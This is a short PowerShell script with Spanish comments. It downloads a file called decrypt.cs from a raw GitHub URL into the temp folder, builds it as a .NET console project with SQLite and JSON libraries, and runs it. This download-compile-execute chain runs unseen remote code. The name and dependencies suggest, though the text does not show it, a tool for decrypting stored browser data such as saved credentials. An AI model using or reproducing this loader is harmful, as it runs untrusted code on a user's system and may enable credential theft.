# Define la URL para el archivo decrypt.cs
$decryptCsUrl = "https://raw.githubusercontent.com/PamvInf/test/master/decrypt.cs"

# Define la ruta de la carpeta del proyecto y el nombre del archivo
$projectPath = "$env:TEMP\DecryptProject"
$decryptCsFileName = "decrypt.cs"
$decryptCsPath = Join-Path $projectPath $decryptCsFileName

# Crear carpeta del proyecto si no existe
if (-not (Test-Path $projectPath)) {
    New-Item -ItemType Directory -Path $projectPath
}

# Descarga decrypt.cs en la carpeta del proyecto
Invoke-WebRequest -Uri $decryptCsUrl -OutFile $decryptCsPath

# Verificar si .NET CLI está disponible
if (-not (Get-Command "dotnet" -ErrorAction SilentlyContinue)) {
    Write-Error "El .NET CLI no está instalado o no está en el PATH. Por favor, instala el SDK de .NET."
    exit 1
}

# Navegar a la carpeta del proyecto
Push-Location -Path $projectPath

# Crear un nuevo proyecto de consola .NET
dotnet new console -n DecryptProject -o .

# Agregar las dependencias necesarias al proyecto
dotnet add package System.Data.SQLite.Core
dotnet add package Newtonsoft.Json

# Mover el archivo decrypt.cs al proyecto y sobreescribir el archivo Program.cs generado automáticamente
Move-Item -Path $decryptCsPath -Destination "Program.cs" -Force

# Compilar el proyecto
dotnet build

# Ejecutar el proyecto
dotnet run

# Volver a la carpeta anterior
Pop-Location

Write-Host "Script completado. El proyecto se ha ejecutado correctamente."
